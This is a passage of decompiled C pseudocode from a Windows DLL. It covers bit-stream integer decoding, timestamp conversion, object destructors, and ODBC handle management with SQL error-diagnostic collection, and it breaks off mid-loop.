    memset(v6, 0, sizeof(v6));
    (*(void (__thiscall **)(_DWORD *, char *, int))(this[5] + 32))(this + 5, v6, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (1004C73D) --------------------------------------------------------
_DWORD *__thiscall sub_1004C73D(void *this, int a2, int *a3)
{
  _DWORD *result; // eax
  int v4; // [esp+8h] [ebp-10h]
  int v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  int v7; // [esp+14h] [ebp-4h]

  v4 = *a3;
  v5 = a3[1];
  v6 = a3[2];
  v7 = a3[3];
  result = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  *result = v4;
  result[1] = v5;
  result[2] = v6;
  result[3] = v7;
  return result;
}

//----- (1004C766) --------------------------------------------------------
_DWORD *__thiscall sub_1004C766(_DWORD *this, _DWORD *a2)
{
  sub_1003EEA7(this + 1, a2);
  return a2;
}

//----- (1004C797) --------------------------------------------------------
_DWORD *__thiscall sub_1004C797(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10104200;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1004C4DB(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104200: using guessed type int (__thiscall *off_10104200)(void *Block, char);

//----- (1004C7F1) --------------------------------------------------------
void *__thiscall sub_1004C7F1(void *Block, char a2)
{
  sub_1004C287((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004C80D) --------------------------------------------------------
_DWORD *__thiscall sub_1004C80D(_DWORD *Block, char a2)
{
  sub_1004C692(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004C829) --------------------------------------------------------
char __userpurge sub_1004C829@<al>(LONG *a1@<eax>, int a2@<ecx>, char a3)
{
  int v5; // eax

  if ( !a1[3] )
    return 0;
  v5 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)a2 + 16))(a2, &a3);
  sub_1000B3BD(a1, v5);
  return 1;
}

//----- (1004C84F) --------------------------------------------------------
struct _SYSTEMTIME *__userpurge sub_1004C84F@<eax>(struct _SYSTEMTIME *a1@<esi>, int a2)
{
  a1->wYear = 0;
  *(_DWORD *)&a1->wMonth = 0;
  *(_DWORD *)&a1->wDay = 0;
  *(_DWORD *)&a1->wMinute = 0;
  a1->wMilliseconds = 0;
  if ( !FileTimeToSystemTime((const FILETIME *)(a2 + 36), a1) )
    memset(a1, 0, sizeof(struct _SYSTEMTIME));
  return a1;
}

//----- (1004C883) --------------------------------------------------------
_DWORD *__stdcall sub_1004C883(_DWORD *a1)
{
  unsigned int i; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_10103D00;
  a1[1] = off_100FBF5C;
  a1[1] = &off_10103D40;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[2] = 0;
  a1[3] = i;
  a1[4] = operator new(4 * i);
  sub_1003EF32(a1 + 5);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103D00: using guessed type int (__thiscall *off_10103D00)(void *Block, char);
// 10103D40: using guessed type int (__thiscall *off_10103D40)(void *Block, char);

//----- (1004C8FA) --------------------------------------------------------
_DWORD *__userpurge sub_1004C8FA@<eax>(void *a1@<esi>, _DWORD *a2)
{
  _DWORD *v2; // eax
  int v4[3]; // [esp+10h] [ebp-10h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  sub_10051978(a1, (int)a2);
  v5 = 0;
  *a2 = &off_10104280;
  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)a1 + 40))(a1) )
  {
    v2 = sub_1000E7F7(v4, 1, 0);
    LOBYTE(v5) = 1;
    sub_10007882((int)v2);
  }
  return a2;
}
// 10104280: using guessed type int (__thiscall *off_10104280)(void *Block, char);
// 1004C8FA: using guessed type int var_10[3];

//----- (1004C94C) --------------------------------------------------------
_BYTE *__thiscall sub_1004C94C(_BYTE *Block, char a2)
{
  sub_1004C968(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004C968) --------------------------------------------------------
void *__thiscall sub_1004C968(_BYTE *this)
{
  *(_DWORD *)this = &off_10104280;
  return sub_10051A11(this);
}
// 10104280: using guessed type int (__thiscall *off_10104280)(void *Block, char);

//----- (1004C98C) --------------------------------------------------------
__int16 __stdcall sub_1004C98C(void *a1)
{
  int v1; // eax
  int v2; // ecx
  _DWORD *v3; // eax
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  const void *v7; // eax
  __int16 v8; // si
  int pExceptionObject[5]; // [esp+10h] [ebp-44h] BYREF
  char v11[8]; // [esp+24h] [ebp-30h] BYREF
  char v12[8]; // [esp+2Ch] [ebp-28h] BYREF
  _DWORD v13[2]; // [esp+34h] [ebp-20h] BYREF
  int v14; // [esp+3Ch] [ebp-18h] BYREF
  char v15[13]; // [esp+43h] [ebp-11h] BYREF
  int v16; // [esp+50h] [ebp-4h]

  v15[0] = 0;
  if ( sub_10051C21((int)a1, v15, 1, 2u, 0) != 2 )
  {
    v1 = sub_1000E88D((int)v13, 1, 0);
    v16 = 0;
    sub_10012582(v1, 34);
  }
  v14 = 0;
  sub_1000B1F3((void *)2, (int)pExceptionObject, 0);
  v16 = 1;
  sub_1000B79B(v2, pExceptionObject);
  if ( v15[0] )
  {
    switch ( v15[0] )
    {
      case 1:
        if ( sub_10051B24(a1, pExceptionObject, (int (__thiscall **)(void *, char))8, 0) != 8 )
        {
          v5 = sub_1000E88D((int)v12, 1, 0);
          LOBYTE(v16) = 3;
          sub_10012582(v5, 57);
        }
        v14 = *(unsigned __int8 *)sub_1000B4CB((int)pExceptionObject, v4, 1);
        break;
      case 2:
        v14 = 0;
        break;
      case 3:
        v14 = 256;
        break;
      default:
        v3 = sub_10040C98(v13);
        LOBYTE(v16) = 4;
        sub_10042D5F((int)v3, 71);
    }
  }
  else
  {
    if ( sub_10051B24(a1, pExceptionObject, (int (__thiscall **)(void *, char))0x10, 0) != 16 )
    {
      v6 = sub_1000E88D((int)v11, 1, 0);
      LOBYTE(v16) = 2;
      sub_10012582(v6, 48);
    }
    v7 = (const void *)sub_1000B4B8(pExceptionObject);
    memcpy(&v14, v7, 2u);
  }
  v8 = v14;
  v16 = -1;
  sub_1000B3DF(pExceptionObject);
  return v8;
}
// 1004C9E0: variable 'v2' is possibly undefined
// 1004CA49: variable 'v4' is possibly undefined
// 1004C98C: using guessed type char var_11[13];
// 1004C98C: using guessed type _DWORD var_20[2];
// 1004C98C: using guessed type int var_18;
// 1004C98C: using guessed type char var_28[8];
// 1004C98C: using guessed type char var_30[8];

//----- (1004CAB6) --------------------------------------------------------
int __stdcall sub_1004CAB6(void *a1)
{
  int v1; // ecx
  int v2; // edi
  bool v3; // al
  unsigned __int8 v4; // bl
  int v5; // ecx
  _BYTE *v6; // eax
  int v7; // ecx
  unsigned __int8 v8; // bl
  int v9; // esi
  int v10; // eax
  int v11; // esi
  _DWORD *v13; // eax
  int v14; // eax
  int v15[3]; // [esp+10h] [ebp-34h] BYREF
  int v16; // [esp+1Ch] [ebp-28h]
  _DWORD v17[2]; // [esp+24h] [ebp-20h] BYREF
  int v18[2]; // [esp+2Ch] [ebp-18h] BYREF
  bool v19; // [esp+34h] [ebp-10h]
  bool v20; // [esp+35h] [ebp-Fh]
  char v21; // [esp+36h] [ebp-Eh] BYREF
  unsigned __int8 v22; // [esp+37h] [ebp-Dh]
  int v23; // [esp+40h] [ebp-4h]

  sub_1000B1F3((void *)8, (int)v15, 0);
  v23 = 0;
  sub_1000B79B(v1, v15);
  v2 = v16 - 1;
  v20 = 0;
  v22 = 0;
  do
  {
    v3 = sub_1004CC71(a1);
    v19 = v3;
    if ( v3 && !v2 )
    {
      v13 = sub_10040C98(v17);
      LOBYTE(v23) = 1;
      sub_10042D5F((int)v13, 103);
    }
    v21 = 0;
    v4 = 7;
    if ( !v3 )
    {
      v20 = sub_1004CC71(a1);
      v4 = 6;
    }
    if ( v4 != sub_10051C21((int)a1, &v21, 1, v4, 0) )
    {
      v14 = sub_1000E88D((int)v17, 1, 0);
      LOBYTE(v23) = 2;
      sub_10012582(v14, 119);
    }
    v6 = (_BYTE *)sub_1000B4CB((int)v15, v5, v2);
    *v6 = v21;
    --v2;
    if ( v4 != 8 )
      sub_10052027(a1, v15, 8 - v4, 1);
    v22 += 8 - v4;
  }
  while ( v19 );
  if ( v22 )
    sub_10052027(a1, v15, v22, 0);
  v7 = 0;
  v8 = 0;
  v9 = v16 - 1;
  v18[0] = 0;
  v18[1] = 0;
  if ( v16 - 1 >= 0 )
  {
    do
    {
      v10 = sub_1000B4B8(v15);
      memcpy((char *)v18 + v8++, (const void *)(v9 + v10), sizeof(char));
      --v9;
    }
    while ( v9 >= 0 );
    v7 = v18[0];
  }
  if ( v20 )
    v7 = -v7;
  v11 = v7;
  v23 = -1;
  sub_1000B3DF(v15);
  return v11;
}
// 1004CAD7: variable 'v1' is possibly undefined
// 1004CB36: variable 'v5' is possibly undefined
// 1004CAB6: using guessed type int var_34[3];
// 1004CAB6: using guessed type _DWORD var_20[2];

//----- (1004CC0D) --------------------------------------------------------
int __stdcall sub_1004CC0D(int a1)
{
  int v1; // eax
  char v3[8]; // [esp+10h] [ebp-1Ch] BYREF
  char v4[16]; // [esp+18h] [ebp-14h] BYREF
  int v5; // [esp+28h] [ebp-4h]

  memset(v4, 0, 2u);
  if ( sub_10051C21(a1, v4, 2, 0x10u, 0) != 16 )
  {
    v1 = sub_1000E88D((int)v3, 1, 0);
    v5 = 0;
    sub_10012582(v1, 174);
  }
  return (unsigned __int8)v4[1] + ((unsigned __int8)v4[0] << 8);
}
// 1004CC0D: using guessed type char var_1C[8];

//----- (1004CC71) --------------------------------------------------------
BOOL __thiscall sub_1004CC71(void *this)
{
  int v1; // eax
  char v3[11]; // [esp+10h] [ebp-18h] BYREF
  char v4[9]; // [esp+1Bh] [ebp-Dh] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v4[0] = 0;
  if ( sub_10051C21((int)this, v4, 1, 1u, 0) != 1 )
  {
    v1 = sub_1000E88D((int)v3, 1, 0);
    v5 = 0;
    sub_10012582(v1, 186);
  }
  return v4[0] == 1;
}
// 1004CC71: using guessed type char var_D[9];
// 1004CC71: using guessed type char var_18[11];

//----- (1004CCC0) --------------------------------------------------------
_DWORD *__stdcall sub_1004CCC0(void *a1, _DWORD *pExceptionObject)
{
  void *v2; // ebx
  int v3; // ecx
  int v4; // eax
  char v6[8]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v2 = (void *)(unsigned __int16)sub_1004C98C(a1);
  sub_1000B1F3(v2, (int)pExceptionObject, 0);
  v8 = 0;
  v7 = 1;
  sub_1000B79B(v3, pExceptionObject);
  if ( 8 * (_DWORD)v2 != sub_10051B24(a1, pExceptionObject, (int (__thiscall **)(void *, char))(8 * (_DWORD)v2), 0) )
  {
    v4 = sub_1000E88D((int)v6, 1, 0);
    v8 = 1;
    sub_10012582(v4, 201);
  }
  return pExceptionObject;
}
// 1004CCF6: variable 'v3' is possibly undefined
// 1004CCC0: using guessed type char var_18[8];

//----- (1004CD33) --------------------------------------------------------
char __stdcall sub_1004CD33(_BYTE *a1)
{
  unsigned int v1; // eax
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  char v6[13]; // [esp+1Bh] [ebp-11h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  v6[0] = 0;
  v1 = sub_10051C21((int)a1, v6, 1, 2u, 0);
  if ( v1 != 2 )
  {
    v2 = sub_1000E88D((int)v5, 1, 0);
    v7 = 0;
    sub_10012582(v2, 217);
  }
  if ( v6[0] )
  {
    if ( v6[0] > 2u )
    {
      v3 = sub_10040C98(v5);
      v7 = 1;
      sub_10042D5F((int)v3, 233);
    }
  }
  else
  {
    LOBYTE(v1) = sub_1004CFD6(0x40u, a1);
  }
  return v1;
}
// 1004CD79: conditional instruction was optimized away because %var_11.1!=0
// 1004CD33: using guessed type char var_11[13];
// 1004CD33: using guessed type _DWORD var_1C[2];

//----- (1004CDAF) --------------------------------------------------------
char __usercall sub_1004CDAF@<al>(_BYTE *a1@<edi>)
{
  int v1; // eax
  char result; // al
  _DWORD *v3; // eax
  _DWORD v4[2]; // [esp+10h] [ebp-18h] BYREF
  char v5[9]; // [esp+1Bh] [ebp-Dh] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v5[0] = 0;
  if ( sub_10051C21((int)a1, v5, 1, 2u, 0) != 2 )
  {
    v1 = sub_1000E88D((int)v4, 1, 0);
    v6 = 0;
    sub_10012582(v1, 245);
  }
  result = v5[0];
  if ( v5[0] )
  {
    switch ( v5[0] )
    {
      case 1:
        return sub_1004CFD6(0x20u, a1);
      case 2:
        return sub_1004CFD6(0x30u, a1);
      case 3:
        return sub_1004CFD6(0x40u, a1);
      default:
        v3 = sub_10040C98(v4);
        v6 = 1;
        sub_10042D5F((int)v3, 275);
    }
  }
  return result;
}
// 1004CDAF: using guessed type char var_D[9];
// 1004CDAF: using guessed type _DWORD var_18[2];

//----- (1004CE34) --------------------------------------------------------
char __userpurge sub_1004CE34@<al>(_BYTE *a1@<esi>, unsigned __int8 a2)
{
  char result; // al
  _DWORD *v3; // eax
  _DWORD v4[5]; // [esp+10h] [ebp-14h] BYREF

  if ( a2 == 12 || a2 == 13 || a2 == 14 )
    goto LABEL_6;
  if ( a2 != 15 )
  {
    v3 = sub_10040BB5(v4, a2);
    v4[4] = 0;
    sub_10042D3D((int)v3, 309);
  }
  result = sub_1004CC71(a1);
  if ( !result )
  {
LABEL_6:
    sub_1004CD33(a1);
    sub_1004CD33(a1);
    return sub_1004CD33(a1);
  }
  return result;
}

//----- (1004CE95) --------------------------------------------------------
char __stdcall sub_1004CE95(_BYTE *a1, unsigned __int8 a2)
{
  char result; // al
  _DWORD *v3; // eax
  _DWORD v4[6]; // [esp+10h] [ebp-18h] BYREF

  if ( a2 == 12 || a2 == 13 || a2 == 14 )
    return sub_1004CD33(a1);
  if ( a2 != 15 )
  {
    v3 = sub_10040BB5(v4, a2);
    v4[5] = 0;
    sub_10042D3D((int)v3, 336);
  }
  result = sub_1004CC71(a1);
  if ( !result )
    return sub_1004CD33(a1);
  return result;
}

//----- (1004CEED) --------------------------------------------------------
char __stdcall sub_1004CEED(_BYTE *a1)
{
  int v1; // eax
  char result; // al
  _DWORD *v3; // eax
  _DWORD v4[2]; // [esp+10h] [ebp-1Ch] BYREF
  char v5[13]; // [esp+1Bh] [ebp-11h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  v5[0] = 0;
  if ( sub_10051C21((int)a1, v5, 1, 2u, 0) != 2 )
  {
    v1 = sub_1000E88D((int)v4, 1, 0);
    v6 = 0;
    sub_10012582(v1, 347);
  }
  if ( !v5[0] )
    return sub_1004CFD6(0x20u, a1);
  if ( v5[0] == 1 )
    return sub_1004CFD6(8u, a1);
  result = v5[0] - 2;
  if ( v5[0] != 2 )
  {
    v3 = sub_10040C98(v4);
    v6 = 1;
    sub_10042D5F((int)v3, 367);
  }
  return result;
}
// 1004CEED: using guessed type char var_11[13];
// 1004CEED: using guessed type _DWORD var_1C[2];

//----- (1004CF71) --------------------------------------------------------
char __stdcall sub_1004CF71(_BYTE *a1)
{
  int v1; // eax
  char v3[11]; // [esp+10h] [ebp-1Ch] BYREF
  char v4[13]; // [esp+1Bh] [ebp-11h] BYREF
  int v5; // [esp+28h] [ebp-4h]

  sub_1004CFD6(4u, a1);
  v4[0] = 0;
  if ( sub_10051C21((int)a1, v4, 1, 4u, 0) != 4 )
  {
    v1 = sub_1000E88D((int)v3, 1, 0);
    v5 = 0;
    sub_10012582(v1, 402);
  }
  return sub_1004CFD6(8 * (unsigned __int8)v4[0], a1);
}
// 1004CF71: using guessed type char var_11[13];
// 1004CF71: using guessed type char var_1C[11];

//----- (1004CFD6) --------------------------------------------------------
char __userpurge sub_1004CFD6@<al>(unsigned int a1@<eax>, _BYTE *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+10h] [ebp-Ch]
  int v8; // [esp+14h] [ebp-8h]

  sub_10051AA5(a2, &v5);
  v8 = v6;
  v3 = a1 & 7;
  v7 = v5;
  LOBYTE(v8) = (v3 + (unsigned __int8)v6) % 8;
  return sub_10051A4C(a2, v5 + (v3 + (unsigned __int8)v6 >= 8) + (a1 >> 3), v8);
}

//----- (1004D03B) --------------------------------------------------------
_DWORD *__stdcall sub_1004D03B(_DWORD *a1, int a2)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_101042C8;
  sub_1000D372(a1 + 1, a2);
  return a1;
}
// 101042C8: using guessed type int (__thiscall *off_101042C8)(void *Block, char);

//----- (1004D079) --------------------------------------------------------
int *__thiscall sub_1004D079(int *Block, char a2)
{
  sub_1004D095(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004D095) --------------------------------------------------------
void __thiscall sub_1004D095(int *this)
{
  sub_1000D3AD(this + 1);
  sub_1000E843(this);
}

//----- (1004D0C3) --------------------------------------------------------
int __userpurge sub_1004D0C3@<eax>(char a1@<cl>, int a2@<esi>, SQLSMALLINT HandleType, SQLHANDLE InputHandle)
{
  SQLRETURN v4; // ax
  _DWORD *v6; // eax
  int v7[2]; // [esp+4h] [ebp-30h] BYREF
  int v8[3]; // [esp+Ch] [ebp-28h] BYREF
  _DWORD pExceptionObject[4]; // [esp+18h] [ebp-1Ch] BYREF
  int v10; // [esp+30h] [ebp-4h]

  *(_DWORD *)a2 = off_101042C4;
  *(_WORD *)(a2 + 4) = HandleType;
  *(_BYTE *)(a2 + 12) = a1;
  if ( HandleType == 1 )
    InputHandle = 0;
  v4 = SQLAllocHandle(HandleType, InputHandle, (SQLHANDLE *)(a2 + 8));
  if ( v4 == -1 || v4 == 1 )
  {
    sub_1000D17D(v7, &word_10130938);
    v10 = 0;
    v6 = sub_1004D03B(v8, (int)v7);
    LOBYTE(v10) = 1;
    sub_1004D5A4(pExceptionObject, (int)v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVGADQYuondwswg_BurqUpfqufhkrx_wvnem__);
  }
  return a2;
}
// 101042C4: using guessed type int (__thiscall *off_101042C4[2])(void *Block, char);
// 1004D0C3: using guessed type int var_28[3];
// 1004D0C3: using guessed type _DWORD pExceptionObject[4];

//----- (1004D17F) --------------------------------------------------------
void *__thiscall sub_1004D17F(void *Block, char a2)
{
  sub_1004D19B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004D19B) --------------------------------------------------------
void __thiscall sub_1004D19B(void *this)
{
  SQLRETURN v2; // di
  bool v3; // zf
  __int32 v4; // eax
  int v5; // ecx
  int v6; // [esp-8h] [ebp-34h] BYREF
  int v7; // [esp-4h] [ebp-30h]
  void *v8; // [esp+10h] [ebp-1Ch]
  int v9[3]; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-4h]

  v2 = 0;
  v3 = *((_WORD *)this + 2) == 3;
  *(_DWORD *)this = off_101042C4;
  if ( v3 )
    v2 = SQLCloseCursor(*((SQLHSTMT *)this + 2));
  v4 = (unsigned __int16)SQLFreeHandle(*((_WORD *)this + 2), *((SQLHANDLE *)this + 2));
  if ( v2 || (_WORD)v4 )
  {
    sub_10029BC2(v4);
    sub_1000D17D(v9, &word_1013093C);
    v10 = 0;
    v7 = v5;
    v6 = v5;
    v8 = &v6;
    sub_1000728E(&v6, 0);
    LOBYTE(v10) = 0;
    sub_1004F292((_DWORD *)dword_10182DE8, 111, (int)v9, v6, v7);
    v10 = -1;
    sub_1000D3AD(v9);
  }
}
// 1004D215: variable 'v5' is possibly undefined
// 101042C4: using guessed type int (__thiscall *off_101042C4[2])(void *Block, char);
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1004D260) --------------------------------------------------------
void __cdecl sub_1004D260(__int16 a1)
{
  void *v1; // ecx
  void *v2; // esi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  wchar_t *v7; // eax
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // ecx
  _DWORD *v11; // eax
  int v12; // [esp-Ch] [ebp-298h]
  int v13; // [esp-8h] [ebp-294h] BYREF
  int v14; // [esp-4h] [ebp-290h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-27Ch] BYREF
  int v16[2]; // [esp+1Ch] [ebp-270h] BYREF
  int v17[2]; // [esp+24h] [ebp-268h] BYREF
  int v18; // [esp+2Ch] [ebp-260h] BYREF
  int v19[2]; // [esp+38h] [ebp-254h] BYREF
  int v20; // [esp+40h] [ebp-24Ch] BYREF
  LONG v21; // [esp+44h] [ebp-248h] BYREF
  SQLSMALLINT iRecord[2]; // [esp+48h] [ebp-244h]
  void *v23; // [esp+4Ch] [ebp-240h]
  int v24; // [esp+50h] [ebp-23Ch] BYREF
  LONG v25; // [esp+54h] [ebp-238h] BYREF
  int v26[2]; // [esp+58h] [ebp-234h] BYREF
  SQLSMALLINT pcbErrorMsg[2]; // [esp+60h] [ebp-22Ch] BYREF
  SQLINTEGER pfNativeError; // [esp+64h] [ebp-228h] BYREF
  SQLCHAR szErrorMsg[516]; // [esp+68h] [ebp-224h] BYREF
  SQLCHAR szSqlState[28]; // [esp+26Ch] [ebp-20h] BYREF
  int v31; // [esp+288h] [ebp-4h]

  v2 = v1;
  v23 = v1;
  szSqlState[0] = byte_10130877;
  *(_DWORD *)&szSqlState[1] = 0;
  szSqlState[5] = 0;
  szErrorMsg[0] = byte_101308CE;
  memset(&szErrorMsg[1], 0, 0x1FFu);
  pfNativeError = 0;
  *(_DWORD *)pcbErrorMsg = 0;
  sub_1000D17D(v26, &word_10130940);
  v31 = 0;
  sub_1000D17D(v19, &word_10130944);
  LOBYTE(v31) = 1;
  sub_1000D17D(&v20, &word_10130948);
  LOBYTE(v31) = 2;
  v3 = sub_1000D17D(&v24, &word_1013094C);
  LOBYTE(v31) = 3;
  LOWORD(v3) = a1;
  if ( a1 && a1 != 100 )
  {
    if ( a1 != -1 && a1 != 1 )
      goto LABEL_17;
    *(_DWORD *)iRecord = 1;
    while ( 1 )
    {
      LOWORD(v3) = SQLGetDiagRecA(
                     *((_WORD *)v2 + 2),
                     *((SQLHANDLE *)v2 + 2),
                     iRecord[0],
                     szSqlState,
                     &pfNativeError,
                     szErrorMsg,
                     512,
                     pcbErrorMsg);
      if ( (_WORD)v3 )
        break;
      LOBYTE(v31) = 4;
      v4 = sub_1000D3EB(v17, (char *)szSqlState);
      LOBYTE(v31) = 5;
      sub_10001236(v4 + 1, &v21);
      LOBYTE(v31) = 4;
      sub_1000D3AD(v17);
      v5 = sub_1000D3EB(v16, (char *)szErrorMsg);
      LOBYTE(v31) = 6;
      sub_10001236(v5 + 1, &v25);
      LOBYTE(v31) = 4;
      sub_1000D3AD(v16);
      v31 = 3;
      v6 = *(_DWORD *)(v21 + 12);
      v14 = *(_DWORD *)(v25 + 12);
      v13 = pfNativeError;
      v12 = v6;
      v7 = (wchar_t *)sub_1000CC40((int)&unk_101309E8);
      v8 = (_DWORD *)sub_1000D6C3((int)v19, v7, v12, v13, v14);
      sub_1000D575((int)v26, v8);
      *(_DWORD *)pcbErrorMsg = 0;
      pfNativeError = 0;
      memset(szSqlState, 0, 6u);
      memset(szErrorMsg, 0, 0x200u);
      ++*(_DWORD *)iRecord;
      v2 = v23;
    }
    if ( a1 != 1 )
    {
LABEL_17:
      if ( *((_BYTE *)v2 + 12) )
      {
        sub_10029BC2((__int32)v3);
        v14 = v10;
        v13 = v10;
        v23 = &v13;
        sub_1000728E(&v13, 0);
        LOBYTE(v31) = 3;
        sub_1004F292((_DWORD *)dword_10182DE8, 204, (int)v26, v13, v14);
      }
      v11 = sub_1004D03B(&v18, (int)v26);
      LOBYTE(v31) = 11;
      sub_1004D5A4(pExceptionObject, (int)v11);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVGADQYuondwswg_BurqUpfqufhkrx_wvnem__);
    }
    if ( *((_BYTE *)v2 + 12) )
    {
      sub_10029BC2((__int32)v3);
      v14 = v9;
      v13 = v9;
      v23 = &v13;
      sub_1000728E(&v13, 0);
      LOBYTE(v31) = 3;
      sub_1004F292((_DWORD *)dword_10182DE8, 108, (int)v26, v13, v14);
    }
  }
  LOBYTE(v31) = 2;
  sub_1000D3AD(&v24);
  LOBYTE(v31) = 1;
  sub_1000D3AD(&v20);
  LOBYTE(v31) = 0;
  sub_1000D3AD(v19);
  v31 = -1;
  sub_1000D3AD(v26);
  sub_1009FFCE();
}
// 1004D26F: variable 'v1' is possibly undefined
// 1004D4BD: variable 'v3' is possibly undefined
// 1004D4C2: variable 'v9' is possibly undefined
// 1004D539: variable 'v10' is possibly undefined
// 10130877: using guessed type char byte_10130877;
// 101308CE: using guessed type char byte_101308CE;
// 10182DE8: using guessed type int dword_10182DE8;
// 1004D260: using guessed type _DWORD pExceptionObject[3];

//----- (1004D5A4) --------------------------------------------------------
_DWORD *__thiscall sub_1004D5A4(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_101042C8;
  sub_1000D372(this + 1, a2 + 4);
  return this;
}
// 101042C8: using guessed type int (__thiscall *off_101042C8)(void *Block, char);

//----- (1004D5E3) --------------------------------------------------------
bool __userpurge sub_1004D5E3@<al>(int a1@<ecx>, _DWORD *a2@<esi>, _BYTE *a3)
{
  int v3; // eax
  unsigned int i; // ecx

  v3 = sub_1000B49B(a2, a1);
  if ( *a3 == 1 )
  {
    for ( i = 0; i < a2[3]; ++i )
      *(_BYTE *)(v3 + i) = byte_100FF510[*(unsigned __int8 *)(v3 + i)];
    return 1;
  }
  return *a3 == 2;
}

//----- (1004D61F) --------------------------------------------------------
int *__thiscall sub_1004D61F(int *Block, char a2)
{
  sub_1004D63B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004D63B) --------------------------------------------------------
void *__thiscall sub_1004D63B(int *this)
{
  *this = (int)&off_101042D0;
  sub_1000D3AD(this + 5);
  return sub_100068A5(this + 1);
}
// 101042D0: using guessed type int (__thiscall *off_101042D0)(void *Block, char);

//----- (1004D670) --------------------------------------------------------
void __stdcall sub_1004D670(int a1)
{
  _DWORD *v1; // eax
  _DWORD *i; // eax
  _DWORD *v3; // eax
  _DWORD *j; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  int v7; // edx
  _DWORD *v8; // eax
  bool v9; // bl
  int v10; // edx
  _DWORD *v11; // eax
  bool v12; // bl
  _DWORD *v13; // eax
  bool v14; // bl
  bool v15; // [esp+17h] [ebp-1BDh]
  int v16[2]; // [esp+18h] [ebp-1BCh] BYREF
  int v17[2]; // [esp+20h] [ebp-1B4h] BYREF
  int v18[7]; // [esp+28h] [ebp-1ACh] BYREF
  int v19[2]; // [esp+44h] [ebp-190h] BYREF
  int v20[2]; // [esp+4Ch] [ebp-188h] BYREF
  int v21[2]; // [esp+54h] [ebp-180h] BYREF
  int v22[2]; // [esp+5Ch] [ebp-178h] BYREF
  int v23[7]; // [esp+64h] [ebp-170h] BYREF
  int v24[7]; // [esp+80h] [ebp-154h] BYREF
  int v25[7]; // [esp+9Ch] [ebp-138h] BYREF
  int v26[7]; // [esp+B8h] [ebp-11Ch] BYREF
  int v27[20]; // [esp+D4h] [ebp-100h] BYREF
  int v28[20]; // [esp+124h] [ebp-B0h] BYREF
  int v29[21]; // [esp+174h] [ebp-60h] BYREF
  int v30; // [esp+1D0h] [ebp-4h]

  sub_1000E111(a1 + 20);
  sub_1000D17D(v16, asc_101308D4);
  v30 = 0;
  sub_10020BBA(v29, a1 + 20, (int)v16);
  LOBYTE(v30) = 2;
  sub_1000D3AD(v16);
  sub_10020CA0(v29, v26);
  LOBYTE(v30) = 3;
  v15 = 1;
  sub_1000D17D(v16, asc_101308DC);
  LOBYTE(v30) = 4;
  v1 = sub_10020DE6(v26, v17);
  LOBYTE(v30) = 5;
  sub_10020BBA(v28, (int)v1, (int)v16);
  LOBYTE(v30) = 7;
  sub_1000D3AD(v17);
  LOBYTE(v30) = 8;
  sub_1000D3AD(v16);
  sub_10020CA0(v28, v18);
  LOBYTE(v30) = 9;
  for ( i = sub_10020CDA(v28, v25); ; i = sub_10020CDA(v28, v25) )
  {
    LOBYTE(v30) = 10;
    v14 = !sub_10020EC4((int)v18, (int)i);
    LOBYTE(v30) = 9;
    sub_100511C9(v25);
    if ( !v14 )
      break;
    if ( v15 )
    {
      sub_1000D17D(v16, asc_101308E0);
      LOBYTE(v30) = 11;
      v3 = sub_10020DE6(v18, v17);
      LOBYTE(v30) = 12;
      sub_10020BBA(v27, (int)v3, (int)v16);
      LOBYTE(v30) = 14;
      sub_1000D3AD(v17);
      LOBYTE(v30) = 15;
      sub_1000D3AD(v16);
      sub_10020CA0(v27, v23);
      LOBYTE(v30) = 16;
      for ( j = sub_10020CDA(v27, v24); ; j = sub_10020CDA(v27, v24) )
      {
        LOBYTE(v30) = 17;
